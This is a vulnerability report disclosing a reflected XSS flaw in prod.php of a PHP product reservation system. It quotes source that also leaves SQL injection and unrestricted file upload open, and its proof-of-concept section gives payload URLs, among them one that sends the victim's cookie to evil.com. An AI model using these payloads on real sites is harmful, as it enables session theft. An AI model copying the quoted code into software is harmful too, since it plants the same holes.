# Reflected XSS Vulnerability in prod.php

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: handgunner-administrator/prod.php

**Version**: V1.0

**Description**:

A reflected Cross-Site Scripting (XSS) vulnerability exists in the product upload functionality. User-supplied input is directly output into JavaScript code without proper sanitization or encoding, allowing attackers to execute arbitrary JavaScript in victims' browsers.

### Analyse

**Vulnerability: Reflected XSS in JavaScript Context**

```php
<?php include('../config/config.php'); ?>
<script type="text/javascript">
function redirectUser(){
// Line 4: VULNERABLE! User input directly echoed into JavaScript
window.location = "add_prod.php?id=<?php echo $_GET['cat']; ?>";
} </script>
<body onload="setTimeout('redirectUser()', 5000)" >
<?php

 if (file_exists("upload/" . $_FILES["image"]["name"]))
      {
      /* echo $_FILES["image"]["name"] . " already exists. "; */
      }
    else
      {
      move_uploaded_file($_FILES["image"]["tmp_name"],
      "upload/" . $_FILES["image"]["name"]);
      echo "Stored in: " . "upload/" . $_FILES["image"]["name"];
      }



$image = $_FILES['image']['name'];

$price = $_POST['price'];
$model = $_POST['model'];
$name = $_POST['name'];
$serial = $_POST['serial'];
$description = $_POST['description'];

mysql_query("INSERT INTO products (price, name, image, model, serial_no)
VALUES('$price', '$name', '$image', '$model', '$serial')") or die(mysql_error());

$id = mysql_query("SELECT * FROM products GROUP BY id ORDER BY id DESC LIMIT 1") or die(mysql_error());

$p_id = mysql_fetch_array($id);

$id = $p_id['id'] + 1;
$cat = $_GET['cat'];
mysql_query("INSERT into cat_prod (prod, cat) VALUES('$id', '$cat')") or die(mysql_error());
/* header('location: add_prod.php?id='.$cat); */
?>

<strong>please Wait While we are saving the product . . .</strong>
</body>
```

**Vulnerability Analysis**:

1. **Unfiltered User Input**: The `cat` parameter from GET request is directly echoed (line 4)
2. **JavaScript Context**: Output into JavaScript code within window.location assignment
3. **No Encoding**: No HTML or JavaScript encoding applied to user input
4. **Reflected Attack**: Immediately reflects user input back to browser
5. **No Authentication**: File can be accessed without login in some configurations

### POC

**Basic XSS Payload**:
```bash
http://localhost:8081/handgunner-administrator/prod.php?cat=<script>alert('XSS')</script>
```

**JavaScript Injection**:
```bash
http://localhost:8081/handgunner-administrator/prod.php?cat=';alert('XSS');//
```

**Session Stealing Payload**:
```bash
# Redirect to evil site to steal session cookie
http://localhost:8081/handgunner-administrator/prod.php?cat=';document.location='http://evil.com/steal.php?c='+document.cookie;//
```

![1767438527873.png](https://youke3.picui.cn/s1/2026/01/03/6958f88b05a1e.png)

- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
